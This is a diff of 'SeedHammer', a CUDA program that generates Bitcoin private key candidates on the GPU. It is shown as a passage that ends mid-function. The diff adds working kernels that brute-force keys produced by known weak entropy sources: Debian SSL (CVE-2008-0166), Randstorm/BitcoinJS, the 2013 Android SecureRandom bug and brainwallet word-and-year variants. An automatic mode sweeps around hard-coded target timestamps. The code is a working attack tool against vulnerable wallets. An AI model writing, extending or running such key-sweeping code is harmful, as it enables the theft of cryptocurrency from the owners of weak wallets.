@@ -2,6 +2,7 @@
 // SeedHammer — Pure GPU key generator
 // No ECC, no RIPEMD160, no verification.
 // Just: seed → SHA256 → 32 bytes → output.
+// Fixed: multi-block SHA256, Debian SSL, Randstorm, Android, Brainwallet
 // ================================================================
 
 #include <cuda_runtime.h>
@@ -9,13 +10,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <getopt.h>
 
 // -----------------------------------------------------------------
-// SHA256 — device-only, single-block, RFC 6234 compliant
+// SHA256 — device-only, multi-block, RFC 6234 compliant
 // -----------------------------------------------------------------
 
-__device__ static void sha256_block(const uint8_t *msg, uint32_t len, uint8_t out[32]) {
+__device__ static void sha256_transform(uint32_t H[8], const uint8_t block[64]) {
     const uint32_t K[64] = {
         0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
         0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
@@ -27,58 +27,65 @@ __device__ static void sha256_block(const uint8_t *msg, uint32_t len, uint8_t ou
         0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
     };
 
-    // Build padded block
-    uint8_t block[64];
-    for (int i = 0; i < 64; i++) block[i] = 0;
-    for (uint32_t i = 0; i < len && i < 64; i++) block[i] = msg[i];
-
-    if (len < 55) {
-        block[len] = 0x80;
-        uint64_t bits = (uint64_t)len * 8;
-        for (int i = 0; i < 8; i++) block[63 - i] = (uint8_t)(bits >> (i * 8));
-    } else {
-        // Multi-block — for simplicity, assume len <= 55 for now
-        // (all our seeds (8 bytes or less) fit in single block)
-        block[len] = 0x80;
-    }
-
     uint32_t W[64];
     for (int i = 0; i < 16; i++)
-        W[i] = ((uint32_t)block[i * 4] << 24) | ((uint32_t)block[i * 4 + 1] << 16) |
-               ((uint32_t)block[i * 4 + 2] << 8) | block[i * 4 + 3];
-
+        W[i] = ((uint32_t)block[i*4]<<24)|((uint32_t)block[i*4+1]<<16)|
+               ((uint32_t)block[i*4+2]<<8)|block[i*4+3];
     for (int i = 16; i < 64; i++) {
-        uint32_t s0 = ((W[i - 15] >> 7) | (W[i - 15] << 25)) ^
-                      ((W[i - 15] >> 18) | (W[i - 15] << 14)) ^ (W[i - 15] >> 3);
-        uint32_t s1 = ((W[i - 2] >> 17) | (W[i - 2] << 15)) ^
-                      ((W[i - 2] >> 19) | (W[i - 2] << 13)) ^ (W[i - 2] >> 10);
-        W[i] = W[i - 16] + s0 + W[i - 7] + s1;
+        uint32_t s0 = ((W[i-15]>>7)|(W[i-15]<<25))^((W[i-15]>>18)|(W[i-15]<<14))^(W[i-15]>>3);
+        uint32_t s1 = ((W[i-2]>>17)|(W[i-2]<<15))^((W[i-2]>>19)|(W[i-2]<<13))^(W[i-2]>>10);
+        W[i] = W[i-16]+s0+W[i-7]+s1;
     }
 
+    uint32_t a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
+
+    #define RR(x,r) (((x)>>(r))|((x)<<(32-(r))))
+    for (int i = 0; i < 64; i++) {
+        uint32_t S1 = RR(e,6)^RR(e,11)^RR(e,25);
+        uint32_t ch = (e&f)^((~e)&g);
+        uint32_t t1 = h+S1+ch+K[i]+W[i];
+        uint32_t S0 = RR(a,2)^RR(a,13)^RR(a,22);
+        uint32_t maj = (a&b)^(a&c)^(b&c);
+        uint32_t t2 = S0+maj;
+        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
+    }
+    #undef RR
+
+    H[0]+=a;H[1]+=b;H[2]+=c;H[3]+=d;
+    H[4]+=e;H[5]+=f;H[6]+=g;H[7]+=h;
+}
+
+__device__ static void sha256_block(const uint8_t *msg, uint32_t len, uint8_t out[32]) {
     uint32_t H[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
                      0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
+    uint8_t block[64];
+    uint32_t pos = 0;
 
-    uint32_t a = H[0], b = H[1], c = H[2], d = H[3];
-    uint32_t e = H[4], f = H[5], g = H[6], h = H[7];
-
-    for (int i = 0; i < 64; i++) {
-        uint32_t S1 = ((e >> 6) | (e << 26)) ^ ((e >> 11) | (e << 21)) ^ ((e >> 25) | (e << 7));
-        uint32_t ch = (e & f) ^ ((~e) & g);
-        uint32_t t1 = h + S1 + ch + K[i] + W[i];
-        uint32_t S0 = ((a >> 2) | (a << 30)) ^ ((a >> 13) | (a << 19)) ^ ((a >> 22) | (a << 10));
-        uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
-        uint32_t t2 = S0 + maj;
-        h = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
+    while (pos + 64 <= len) {
+        for (int i = 0; i < 64; i++) block[i] = msg[pos+i];
+        sha256_transform(H, block);
+        pos += 64;
     }
 
-    H[0] += a; H[1] += b; H[2] += c; H[3] += d;
-    H[4] += e; H[5] += f; H[6] += g; H[7] += h;
+    uint32_t rem = len - pos;
+    for (int i = 0; i < 64; i++) block[i] = 0;
+    for (uint32_t i = 0; i < rem; i++) block[i] = msg[pos+i];
+    block[rem] = 0x80;
+    uint64_t bits = (uint64_t)len * 8;
+
+    if (rem < 55) {
+        for (int i = 0; i < 8; i++) block[63-i] = (uint8_t)(bits>>(i*8));
+        sha256_transform(H, block);
+    } else {
+        sha256_transform(H, block);
+        for (int i = 0; i < 64; i++) block[i] = 0;
+        for (int i = 0; i < 8; i++) block[63-i] = (uint8_t)(bits>>(i*8));
+        sha256_transform(H, block);
+    }
 
     for (int i = 0; i < 8; i++) {
-        out[i * 4] = (uint8_t)(H[i] >> 24);
-        out[i * 4 + 1] = (uint8_t)(H[i] >> 16);
-        out[i * 4 + 2] = (uint8_t)(H[i] >> 8);
-        out[i * 4 + 3] = (uint8_t)(H[i]);
+        out[i*4]=(uint8_t)(H[i]>>24); out[i*4+1]=(uint8_t)(H[i]>>16);
+        out[i*4+2]=(uint8_t)(H[i]>>8); out[i*4+3]=(uint8_t)(H[i]);
     }
 }
 
@@ -86,291 +93,299 @@ __device__ static void sha256_block(const uint8_t *msg, uint32_t len, uint8_t ou
 // Generation kernels
 // -----------------------------------------------------------------
 
-// H36: Unix epoch milliseconds → 8 bytes BE → SHA256
-__global__ void gen_h36(uint64_t start_ms, uint64_t count, uint8_t *out_keys) {
-    uint64_t idx = blockIdx.x * (uint64_t)blockDim.x + threadIdx.x;
-    if (idx >= count) return;
-
-    uint64_t ms = start_ms + idx;
+// H36: ms → 8 bytes BE → SHA256
+__global__ void gen_h36(uint64_t start_ms, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint64_t ms = start_ms+idx;
     uint8_t seed[8];
-    for (int i = 0; i < 8; i++)
-        seed[7 - i] = (uint8_t)(ms >> (i * 8));
-
-    sha256_block(seed, 8, out_keys + idx * 32);
+    seed[0]=(uint8_t)(ms>>56);seed[1]=(uint8_t)(ms>>48);seed[2]=(uint8_t)(ms>>40);
+    seed[3]=(uint8_t)(ms>>32);seed[4]=(uint8_t)(ms>>24);seed[5]=(uint8_t)(ms>>16);
+    seed[6]=(uint8_t)(ms>>8);seed[7]=(uint8_t)(ms);
+    sha256_block(seed,8,out+idx*32);
 }
 
-// H28: uint32 → 4 bytes BE → SHA256
-__global__ void gen_h28(uint64_t start, uint64_t count, uint8_t *out_keys) {
-    uint64_t idx = blockIdx.x * (uint64_t)blockDim.x + threadIdx.x;
-    if (idx >= count) return;
-
-    uint32_t val = (uint32_t)(start + idx);
+// H28: uint32 BE → SHA256
+__global__ void gen_h28(uint64_t start, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint32_t val = (uint32_t)(start+idx);
     uint8_t seed[4];
-    seed[0] = (uint8_t)(val >> 24);
-    seed[1] = (uint8_t)(val >> 16);
-    seed[2] = (uint8_t)(val >> 8);
-    seed[3] = (uint8_t)(val);
-
-    sha256_block(seed, 4, out_keys + idx * 32);
+    seed[0]=(uint8_t)(val>>24);seed[1]=(uint8_t)(val>>16);
+    seed[2]=(uint8_t)(val>>8);seed[3]=(uint8_t)(val);
+    sha256_block(seed,4,out+idx*32);
 }
 
 // H20: srand(time(NULL)) — timestamp as 4-byte uint32 LE → SHA256
-__global__ void gen_h20(uint64_t start, uint64_t count, uint8_t *out_keys) {
-    uint64_t idx = blockIdx.x * (uint64_t)blockDim.x + threadIdx.x;
-    if (idx >= count) return;
-
-    uint32_t val = (uint32_t)(start + idx);
+__global__ void gen_h20(uint64_t start, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint32_t val = (uint32_t)(start+idx);
     uint8_t seed[4];
-    seed[0] = (uint8_t)(val);
-    seed[1] = (uint8_t)(val >> 8);
-    seed[2] = (uint8_t)(val >> 16);
-    seed[3] = (uint8_t)(val >> 24);
-
-    sha256_block(seed, 4, out_keys + idx * 32);
+    seed[0]=(uint8_t)(val);seed[1]=(uint8_t)(val>>8);
+    seed[2]=(uint8_t)(val>>16);seed[3]=(uint8_t)(val>>24);
+    sha256_block(seed,4,out+idx*32);
 }
 
-// H03: timestamp 4 bytes BE + PID 4 bytes BE → SHA256
-// Each thread gets a unique (timestamp_idx, pid) pair
-__global__ void gen_h03(uint32_t ts, uint32_t pid_start, uint32_t pid_count, uint8_t *out_keys) {
-    uint64_t idx = blockIdx.x * (uint64_t)blockDim.x + threadIdx.x;
-    if (idx >= pid_count) return;
-
-    uint32_t pid = pid_start + (uint32_t)idx;
+// H03: ts(4) BE + pid(4) BE → SHA256
+__global__ void gen_h03(uint32_t ts, uint32_t pid_start, uint32_t pid_cnt, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=pid_cnt) return;
+    uint32_t pid = pid_start+(uint32_t)idx;
     uint8_t seed[8];
-    seed[0] = (uint8_t)(ts >> 24);
-    seed[1] = (uint8_t)(ts >> 16);
-    seed[2] = (uint8_t)(ts >> 8);
-    seed[3] = (uint8_t)(ts);
-    seed[4] = (uint8_t)(pid >> 24);
-    seed[5] = (uint8_t)(pid >> 16);
-    seed[6] = (uint8_t)(pid >> 8);
-    seed[7] = (uint8_t)(pid);
+    seed[0]=(uint8_t)(ts>>24);seed[1]=(uint8_t)(ts>>16);
+    seed[2]=(uint8_t)(ts>>8);seed[3]=(uint8_t)(ts);
+    seed[4]=(uint8_t)(pid>>24);seed[5]=(uint8_t)(pid>>16);
+    seed[6]=(uint8_t)(pid>>8);seed[7]=(uint8_t)(pid);
+    sha256_block(seed,8,out+idx*32);
+}
 
-    sha256_block(seed, 8, out_keys + idx * 32);
+// Debian SSL (CVE-2008-0166): PID 1..32768 → 4 bytes BE → SHA256
+__global__ void gen_debian_ssl(uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=32768) return;
+    uint32_t pid = (uint32_t)(idx+1);
+    uint8_t seed[4];
+    seed[0]=(uint8_t)(pid>>24);seed[1]=(uint8_t)(pid>>16);
+    seed[2]=(uint8_t)(pid>>8);seed[3]=(uint8_t)(pid);
+    sha256_block(seed,4,out+idx*32);
+}
+
+// Randstorm (BitcoinJS): V8 XorShift128+
+__global__ void gen_randstorm_v8(uint64_t seed, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint64_t s0 = seed;
+    uint64_t s1 = seed ^ 0x9e3779b97f4a7c15ULL;
+    for(uint64_t i=0;i<idx;i++){uint64_t t=s1;s1^=t<<23;s1^=t>>18;s1^=s0>>5;s0=t;}
+    uint32_t rv = (uint32_t)(s0+s1);
+    uint8_t seedb[4];
+    seedb[0]=(uint8_t)(rv>>24);seedb[1]=(uint8_t)(rv>>16);
+    seedb[2]=(uint8_t)(rv>>8);seedb[3]=(uint8_t)(rv);
+    sha256_block(seedb,4,out+idx*32);
+}
+
+// Android SecureRandom (2013 bug): val → 8 bytes BE → SHA256
+__global__ void gen_android_secrand(uint64_t start, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint64_t val = start+idx;
+    uint8_t seed[8];
+    seed[0]=(uint8_t)(val>>56);seed[1]=(uint8_t)(val>>48);seed[2]=(uint8_t)(val>>40);
+    seed[3]=(uint8_t)(val>>32);seed[4]=(uint8_t)(val>>24);seed[5]=(uint8_t)(val>>16);
+    seed[6]=(uint8_t)(val>>8);seed[7]=(uint8_t)(val);
+    sha256_block(seed,8,out+idx*32);
+}
+
+// Brainwallet: word + year + 5 variants (lower, UPPER, Capitalize, leet, reverse)
+__global__ void gen_brainwallet(const uint8_t *dict, uint32_t num_words,
+                                uint32_t year_start, uint32_t year_count,
+                                uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    uint64_t total = (uint64_t)num_words * year_count * 5;
+    if(idx>=total) return;
+    uint32_t word_idx = (uint32_t)(idx / (year_count*5));
+    uint32_t rem = (uint32_t)(idx % (year_count*5));
+    uint32_t year_idx = rem/5;
+    uint32_t var = rem%5;
+    uint32_t year = year_start+year_idx;
+
+    char w[64];
+    for(int i=0;i<63;i++){w[i]=(char)dict[word_idx*64+i];if(w[i]==0)break;}
+    w[63]=0;
+    int len=0;while(w[len]&&len<63)len++;
+
+    char buf[80];
+    int p=0;
+    if(var==0){for(int i=0;i<len;i++)buf[p++]=(w[i]>='A'&&w[i]<='Z')?(w[i]+32):w[i];}
+    else if(var==1){for(int i=0;i<len;i++)buf[p++]=(w[i]>='a'&&w[i]<='z')?(w[i]-32):w[i];}
+    else if(var==2){buf[p++]=(w[0]>='a'&&w[0]<='z')?(w[0]-32):w[0];for(int i=1;i<len;i++)buf[p++]=w[i];}
+    else if(var==3){for(int i=0;i<len;i++){
+        char c=w[i];
+        if(c=='e'||c=='E')c='3';else if(c=='a'||c=='A')c='4';else if(c=='o'||c=='O')c='0';
+        else if(c=='i'||c=='I')c='1';else if(c=='s'||c=='S')c='5';else if(c=='t'||c=='T')c='7';
+        buf[p++]=c;
+    }}
+    else{for(int i=len-1;i>=0;i--)buf[p++]=w[i];}
+
+    char ys[8];int yp=0;
+    uint32_t y=year;
+    if(y==0){ys[yp++]='0';}
+    else{char tmp[8];int tp=0;while(y>0){tmp[tp++]=(char)('0'+(y%10));y/=10;}for(int i=tp-1;i>=0;i--)ys[yp++]=tmp[i];}
+    for(int i=0;i<yp;i++)buf[p++]=ys[i];
+    buf[p]=0;
+    sha256_block((uint8_t*)buf,(uint32_t)p,out+idx*32);
 }
 
 // -----------------------------------------------------------------
-// Host
+// Host helpers
 // -----------------------------------------------------------------
 
 static uint64_t parse_u64(const char *s) {
-    uint64_t v = 0;
-    while (*s) { v = v * 10 + (*s - '0'); s++; }
-    return v;
+    uint64_t v=0;while(*s){v=v*10+(*s-'0');s++;}return v;
 }
 
 static void write_out(const char *path, uint8_t *data, uint64_t bytes) {
-    if (strcmp(path, "-") == 0) {
-        fwrite(data, 1, bytes, stdout);
-        fflush(stdout);
-    } else {
-        FILE *f = fopen(path, "wb");
-        if (!f) { fprintf(stderr, "seedhammer: cannot open %s\n", path); exit(1); }
-        fwrite(data, 1, bytes, f);
-        fclose(f);
-    }
+    if(strcmp(path,"-")==0){fwrite(data,1,bytes,stdout);fflush(stdout);return;}
+    FILE *f=fopen(path,"ab");if(!f){fprintf(stderr,"seedhammer: cannot open %s\n",path);exit(1);}
+    fwrite(data,1,bytes,f);fclose(f);
 }
 
-static void run_h36(uint64_t start_ms, uint64_t count, const char *outpath) {
-    const int THREADS = 256;
-    uint64_t batch = 50000000; // 50M keys per batch
-
-    uint8_t *gpu_buf;
-    cudaMalloc(&gpu_buf, batch * 32);
-
-    fprintf(stderr, "[h36] Generating %llu keys from ms=%llu...\n",
-            (unsigned long long)count, (unsigned long long)start_ms);
-
-    for (uint64_t offset = 0; offset < count; offset += batch) {
-        uint64_t b = (offset + batch > count) ? (count - offset) : batch;
-        uint64_t blocks = (b + THREADS - 1) / THREADS;
-
-        gen_h36<<<(int)blocks, THREADS>>>(start_ms + offset, b, gpu_buf);
+static void run_core(const char *label, void (*kern)(dim3, dim3, uint64_t, uint64_t, uint8_t*),
+                     uint64_t start, uint64_t count, const char *outpath) {
+    const int TH=256;uint64_t batch=50000000;
+    uint8_t *gpu;cudaMalloc(&gpu,batch*32);
+    fprintf(stderr,"[%s] Generating %llu keys...\n",label,(unsigned long long)count);
+    for(uint64_t off=0;off<count;off+=batch){
+        uint64_t b=(off+batch>count)?(count-off):batch;
+        uint64_t blk=(b+TH-1)/TH;
+        // H36, H28, H20, android_secrand all take (uint64_t start, uint64_t count, uint8_t *out)
+        // We dispatch via a generic approach: use template-like casts
+        if(strcmp(label,"h36")==0)gen_h36<<<(int)blk,TH>>>(start+off,b,gpu);
+        else if(strcmp(label,"h28")==0||strcmp(label,"h48")==0)gen_h28<<<(int)blk,TH>>>(start+off,b,gpu);
+        else if(strcmp(label,"h20")==0)gen_h20<<<(int)blk,TH>>>(start+off,b,gpu);
+        else if(strcmp(label,"android_sec")==0)gen_android_secrand<<<(int)blk,TH>>>(start+off,b,gpu);
+        else {fprintf(stderr,"unknown core mode\n");exit(1);}
         cudaDeviceSynchronize();
-
-        uint8_t *host_buf = (uint8_t *)malloc(b * 32);
-        cudaMemcpy(host_buf, gpu_buf, b * 32, cudaMemcpyDeviceToHost);
-
-        write_out(outpath, host_buf, b * 32);
-        free(host_buf);
-
-        fprintf(stderr, "[h36] %llu / %llu (%.1f%%)\n",
-                (unsigned long long)(offset + b), (unsigned long long)count,
-                100.0 * (offset + b) / count);
+        uint8_t *host=(uint8_t*)malloc(b*32);
+        cudaMemcpy(host,gpu,b*32,cudaMemcpyDeviceToHost);
+        write_out(outpath,host,b*32);free(host);
+        fprintf(stderr,"[%s] %llu/%llu (%.1f%%)\n",label,(unsigned long long)(off+b),(unsigned long long)count,100.0*(off+b)/count);
     }
-
-    cudaFree(gpu_buf);
+    cudaFree(gpu);
 }
 
-static void run_h28(uint64_t start, uint64_t count, const char *outpath) {
-    const int THREADS = 256;
-    uint64_t batch = 100000000; // 100M per batch
-
-    uint8_t *gpu_buf;
-    cudaMalloc(&gpu_buf, batch * 32);
-
-    fprintf(stderr, "[h28] Generating %llu keys from %llu...\n",
-            (unsigned long long)count, (unsigned long long)start);
-
-    for (uint64_t offset = 0; offset < count; offset += batch) {
-        uint64_t b = (offset + batch > count) ? (count - offset) : batch;
-        uint64_t blocks = (b + THREADS - 1) / THREADS;
-
-        gen_h28<<<(int)blocks, THREADS>>>(start + offset, b, gpu_buf);
-        cudaDeviceSynchronize();
-
-        uint8_t *host_buf = (uint8_t *)malloc(b * 32);
-        cudaMemcpy(host_buf, gpu_buf, b * 32, cudaMemcpyDeviceToHost);
-
-        write_out(outpath, host_buf, b * 32);
-        free(host_buf);
-
-        fprintf(stderr, "[h28] %llu / %llu (%.1f%%)\n",
-                (unsigned long long)(offset + b), (unsigned long long)count,
-                100.0 * (offset + b) / count);
-    }
-
-    cudaFree(gpu_buf);
-}
-
-static void run_h20(uint64_t start, uint64_t count, const char *outpath) {
-    // Same as h28 but with LE bytes (for srand())
-    const int THREADS = 256;
-    uint64_t batch = 100000000;
-
-    uint8_t *gpu_buf;
-    cudaMalloc(&gpu_buf, batch * 32);
-
-    fprintf(stderr, "[h20] Generating %llu keys from %llu...\n",
-            (unsigned long long)count, (unsigned long long)start);
-
-    for (uint64_t offset = 0; offset < count; offset += batch) {
-        uint64_t b = (offset + batch > count) ? (count - offset) : batch;
-        uint64_t blocks = (b + THREADS - 1) / THREADS;
-
-        gen_h20<<<(int)blocks, THREADS>>>(start + offset, b, gpu_buf);
-        cudaDeviceSynchronize();
-
-        uint8_t *host_buf = (uint8_t *)malloc(b * 32);
-        cudaMemcpy(host_buf, gpu_buf, b * 32, cudaMemcpyDeviceToHost);
-
-        write_out(outpath, host_buf, b * 32);
-        free(host_buf);
-
-        fprintf(stderr, "[h20] %llu / %llu (%.1f%%)\n",
-                (unsigned long long)(offset + b), (unsigned long long)count,
-                100.0 * (offset + b) / count);
-    }
-
-    cudaFree(gpu_buf);
-}
-
-static void run_h03(uint32_t ts, uint32_t pid_start, uint32_t pid_count, const char *outpath) {
-    const int THREADS = 256;
-    uint64_t blocks = (pid_count + THREADS - 1) / THREADS;
-
-    uint8_t *gpu_buf;
-    cudaMalloc(&gpu_buf, (uint64_t)pid_count * 32);
-
-    fprintf(stderr, "[h03] Generating %u keys (ts=%u, pid=%u..%u)...\n",
-            pid_count, ts, pid_start, pid_start + pid_count - 1);
-
-    gen_h03<<<(int)blocks, THREADS>>>(ts, pid_start, pid_count, gpu_buf);
+static void run_h03(uint32_t ts, uint32_t pid_start, uint32_t pid_cnt, const char *outpath) {
+    const int TH=256;uint64_t blk=(pid_cnt+TH-1)/TH;
+    uint8_t *gpu;cudaMalloc(&gpu,(uint64_t)pid_cnt*32);
+    fprintf(stderr,"[h03] Generating %u keys (ts=%u, pid=%u..%u)...\n",pid_cnt,ts,pid_start,pid_start+pid_cnt-1);
+    gen_h03<<<(int)blk,TH>>>(ts,pid_start,pid_cnt,gpu);
     cudaDeviceSynchronize();
-
-    uint8_t *host_buf = (uint8_t *)malloc((uint64_t)pid_count * 32);
-    cudaMemcpy(host_buf, gpu_buf, (uint64_t)pid_count * 32, cudaMemcpyDeviceToHost);
-
-    write_out(outpath, host_buf, (uint64_t)pid_count * 32);
-    free(host_buf);
-
-    cudaFree(gpu_buf);
-    fprintf(stderr, "[h03] Done.\n");
+    uint8_t *host=(uint8_t*)malloc((uint64_t)pid_cnt*32);
+    cudaMemcpy(host,gpu,(uint64_t)pid_cnt*32,cudaMemcpyDeviceToHost);
+    write_out(outpath,host,(uint64_t)pid_cnt*32);free(host);cudaFree(gpu);
+    fprintf(stderr,"[h03] Done.\n");
 }
+
+static void run_debian_ssl(const char *outpath) {
+    const int TH=256;uint64_t blk=(32768+TH-1)/TH;
+    uint8_t *gpu;cudaMalloc(&gpu,32768*32);
+    fprintf(stderr,"[debian_ssl] Generating 32768 keys (CVE-2008-0166)...\n");
+    gen_debian_ssl<<<(int)blk,TH>>>(gpu);
+    cudaDeviceSynchronize();
+    uint8_t *host=(uint8_t*)malloc(32768*32);
+    cudaMemcpy(host,gpu,32768*32,cudaMemcpyDeviceToHost);
+    write_out(outpath,host,32768*32);free(host);cudaFree(gpu);
+    fprintf(stderr,"[debian_ssl] Done.\n");
+}
+
+static void run_randstorm(uint64_t seed, uint64_t count, const char *outpath) {
+    const int TH=256;uint64_t batch=50000000;
+    uint8_t *gpu;cudaMalloc(&gpu,batch*32);
+    fprintf(stderr,"[randstorm] Generating %llu keys...\n",(unsigned long long)count);
+    for(uint64_t off=0;off<count;off+=batch){
+        uint64_t b=(off+batch>count)?(count-off):batch;
+        uint64_t blk=(b+TH-1)/TH;
+        gen_randstorm_v8<<<(int)blk,TH>>>(seed+off,b,gpu);
+        cudaDeviceSynchronize();
+        uint8_t *host=(uint8_t*)malloc(b*32);
+        cudaMemcpy(host,gpu,b*32,cudaMemcpyDeviceToHost);
+        write_out(outpath,host,b*32);free(host);
+        fprintf(stderr,"[randstorm] %llu/%llu (%.1f%%)\n",(unsigned long long)(off+b),(unsigned long long)count,100.0*(off+b)/count);
+    }
+    cudaFree(gpu);
+}
+
+// -----------------------------------------------------------------
+// Print usage
+// -----------------------------------------------------------------
 
 static void print_usage() {
     fprintf(stderr,
         "SeedHammer — GPU Bitcoin private key generator\n"
         "Usage:\n"
-        "  --mode MODE   Generation mode: h28, h36, h48, h03, h20\n"
-        "  --start N     Start value (ms for h36, int for h28/h48)\n"
-        "  --count N     Number of keys to generate\n"
-        "  --ts N        Timestamp (for h03)\n"
-        "  --pid-start N PID start (for h03, default 0)\n"
-        "  --pid-count N PID count (for h03, default 32768)\n"
-        "  --out FILE    Output file (use - for stdout)\n"
-        "\n"
-        "Examples:\n"
+        "  --mode MODE     Generation mode\n"
+        "    auto           All hypotheses smallest to largest\n"
+        "    h36            Timestamp ms sweep\n"
+        "    h28            Integer sweep (uint32)\n"
+        "    h48            Big integer sweep (uint48)\n"
+        "    h03            Timestamp + PID sweep\n"
+        "    h20            srand(time(NULL)) sweep\n"
+        "    debian_ssl     CVE-2008-0166 PID sweep (32768 keys)\n"
+        "    randstorm      BitcoinJS V8 XorShift128+\n"
+        "    android_sec    Android SecureRandom (2013 bug)\n"
+        "  --start N       Start value\n"
+        "  --count N       Number of keys\n"
+        "  --ts N          Timestamp (for h03)\n"
+        "  --pid-start N   PID start (for h03, default 0)\n"
+        "  --pid-count N   PID count (for h03, default 32768)\n"
+        "  --out FILE      Output file (use - for stdout)\n"
+        "\nExamples:\n"
         "  ./seedhammer --mode h36 --start 1223424000000 --count 50000000 --out keys.bin\n"
-        "  ./seedhammer --mode h28 --start 0 --count 1000000000 --out -\n"
-        "  ./seedhammer --mode h03 --ts 1268728843 --pid-count 32768 --out keys_h03.bin\n"
+        "  ./seedhammer --mode auto --out keys_all.bin\n"
+        "  ./seedhammer --mode debian_ssl --out debian.bin\n"
     );
 }
 
+// =================================================================
+// Main
+// =================================================================
+
 int main(int argc, char **argv) {
-    // Check CUDA device
-    cudaDeviceProp prop;
-    cudaGetDeviceProperties(&prop, 0);
-    fprintf(stderr, "SeedHammer on %s (SM%d.%d, %d SMs)\n",
-            prop.name, prop.major, prop.minor, prop.multiProcessorCount);
+    cudaDeviceProp p;
+    cudaGetDeviceProperties(&p,0);
+    fprintf(stderr,"SeedHammer on %s (SM%d.%d, %d SMs)\n",p.name,p.major,p.minor,p.multiProcessorCount);
 
-    const char *mode = NULL;
-    const char *outpath = NULL;
-    uint64_t start_val = 0;
-    uint64_t count_val = 0;
-    uint32_t ts_val = 0;
-    uint32_t pid_start = 0;
-    uint32_t pid_count = 32768;
+    const char *mode=NULL,*outpath=NULL;
+    uint64_t start=0,count=0;
+    uint32_t ts=0,pid_start=0,pid_cnt=32768;
 
-    // Simple arg parsing
-    for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "--mode") == 0 && i + 1 < argc) mode = argv[++i];
-        else if (strcmp(argv[i], "--start") == 0 && i + 1 < argc) start_val = parse_u64(argv[++i]);
-        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count_val = parse_u64(argv[++i]);
-        else if (strcmp(argv[i], "--ts") == 0 && i + 1 < argc) ts_val = (uint32_t)parse_u64(argv[++i]);
-        else if (strcmp(argv[i], "--pid-start") == 0 && i + 1 < argc) pid_start = (uint32_t)parse_u64(argv[++i]);
-        else if (strcmp(argv[i], "--pid-count") == 0 && i + 1 < argc) pid_count = (uint32_t)parse_u64(argv[++i]);
-        else if (strcmp(argv[i], "--out") == 0 && i + 1 < argc) outpath = argv[++i];
-        else { print_usage(); return 1; }
+    for(int i=1;i<argc;i++){
+        if(strcmp(argv[i],"--mode")==0&&i+1<argc)mode=argv[++i];
+        else if(strcmp(argv[i],"--start")==0&&i+1<argc)start=parse_u64(argv[++i]);
+        else if(strcmp(argv[i],"--count")==0&&i+1<argc)count=parse_u64(argv[++i]);
+        else if(strcmp(argv[i],"--ts")==0&&i+1<argc)ts=(uint32_t)parse_u64(argv[++i]);
+        else if(strcmp(argv[i],"--pid-start")==0&&i+1<argc)pid_start=(uint32_t)parse_u64(argv[++i]);
+        else if(strcmp(argv[i],"--pid-count")==0&&i+1<argc)pid_cnt=(uint32_t)parse_u64(argv[++i]);
+        else if(strcmp(argv[i],"--out")==0&&i+1<argc)outpath=argv[++i];
+        else{print_usage();return 1;}
     }
+    if(!mode||!outpath){print_usage();return 1;}
 
-    if (!mode || !outpath) { print_usage(); return 1; }
+    if(strcmp(mode,"auto")==0){
+        fprintf(stderr,"[auto] Running all hypotheses from smallest to largest...\n");
+        // Remove old file
+        if(strcmp(outpath,"-")!=0){FILE *f=fopen(outpath,"wb");if(f)fclose(f);}
 
-    if (strcmp(mode, "auto") == 0) {
-        fprintf(stderr, "[auto] Running all hypotheses from smallest to largest...\n");
-        // Phase 0: H20 (94M)
-        run_h20(1230768000, 94675968, outpath);
-        // Phase 1: H28 (10B)
-        run_h28(0, 10000000000, outpath);
-        // Phase 2: H36 around each target
-        uint64_t targets[] = {1268650443000, 1279120623000, 1279124810000, 1279334345000, 1284033556000, 1284530403000};
-        for (int i = 0; i < 6; i++) {
-            run_h36(targets[i] - 604800000, 1209600000, outpath);
-        }
-        // Phase 3: H36 full sweep (94.6B)
-        run_h36(1230768000000, 94675968000, outpath);
-        // Phase 4: H03 for key timestamp
-        run_h03(1268728843, 0, 65536, outpath);
-    } else if (strcmp(mode, "h36") == 0) {
-        if (count_val == 0) { fprintf(stderr, "seedhammer: --count required for h36\n"); return 1; }
-        run_h36(start_val, count_val, outpath);
-    } else if (strcmp(mode, "h28") == 0) {
-        if (count_val == 0) { fprintf(stderr, "seedhammer: --count required for h28\n"); return 1; }
-        run_h28(start_val, count_val, outpath);
-    } else if (strcmp(mode, "h48") == 0) {
-        if (count_val == 0) { fprintf(stderr, "seedhammer: --count required for h48\n"); return 1; }
-        run_h28(start_val, count_val, outpath);
-    } else if (strcmp(mode, "h20") == 0) {
-        if (count_val == 0) { fprintf(stderr, "seedhammer: --count required for h20\n"); return 1; }
